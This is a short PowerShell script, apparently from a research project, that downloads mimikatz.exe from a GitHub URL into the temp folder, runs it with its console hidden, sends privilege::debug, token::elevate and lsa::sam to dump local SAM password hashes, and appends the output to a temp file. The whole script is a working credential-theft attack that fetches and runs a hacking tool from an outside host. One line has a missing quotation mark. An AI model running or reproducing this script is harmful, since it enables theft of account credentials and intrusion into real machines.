# Paths and URL
$TempPath  = $env:TEMP
$ExePath   = Join-Path $TempPath "mimikatz.exe"
$OutPath   = Join-Path $TempPath mimikatz_output.txt"
$Url       = "https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/mimikatz.exe"

# Download if missing
if (-not (Test-Path $ExePath)) {
    Invoke-WebRequest -Uri $Url -OutFile $ExePath -UseBasicParsing
}

# Setup process start info
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $ExePath
$psi.UseShellExecute = $false
$psi.RedirectStandardInput  = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError  = $true
$psi.CreateNoWindow = $true   # set to $false if you want to see the console

# Start process
$process = New-Object System.Diagnostics.Process
$process.StartInfo = $psi
$process.Start() | Out-Null

# Allow startup time
Start-Sleep -Seconds 2

# Send commands
$process.StandardInput.WriteLine("privilege::debug")
Start-Sleep -Milliseconds 1000
$process.StandardInput.WriteLine("token::elevate")
Start-Sleep -Milliseconds 1000
$process.StandardInput.WriteLine("lsa::sam")
$process.StandardInput.Close()

# Read output
$stdout = $process.StandardOutput.ReadToEnd()
$stderr = $process.StandardError.ReadToEnd()

# Wait for process to exit
$process.WaitForExit()

# Save output to file
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@"
--- STDOUT ---
$stdout

--- STDERR ---
$stderr
"@ | Out-File -FilePath $OutPath -Encoding UTF8 -Append
